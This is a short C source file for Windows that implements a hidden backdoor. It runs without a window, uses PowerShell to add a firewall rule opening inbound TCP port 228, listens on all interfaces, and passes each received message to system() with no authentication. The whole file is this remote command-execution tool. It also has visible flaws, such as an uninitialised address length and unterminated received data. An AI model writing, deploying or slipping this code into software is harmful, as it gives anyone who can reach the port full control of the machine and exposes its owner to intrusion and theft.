#include "header.h"


void exec(char command[])
{
    system(command);
}


int CALLBACK wWinMain(HINSTANCE h1, HINSTANCE h2, PWSTR args, int nCmdShow)
{

    exec("powershell -Command \"if (-not (Get-NetFirewallRule -DisplayName 'MyServer Port 228' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName 'MyServer Port 228' -Direction Inbound -Protocol TCP -LocalPort 228 -Action Allow }\"");

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in addr;
    addr.sin_addr.S_un.S_addr = INADDR_ANY;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(228);
    int optval = 1;
    setsockopt(server, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    bind(server, &addr, sizeof(addr));
    listen(server, SOMAXCONN);
    SOCKET newSocket;
    struct sockaddr_in clientAddr;
    int clientAddrLength;
    char checkByte;

    while (1)
    {
        newSocket = accept(server, &clientAddr, &clientAddrLength);
        while (1)
        {
            char message[1024];
            if (recv(newSocket, message, sizeof(message), NULL) <= 0)
                goto close;
            exec(message);
        }
        close:
        closesocket(newSocket);
    }
	return 0;
}
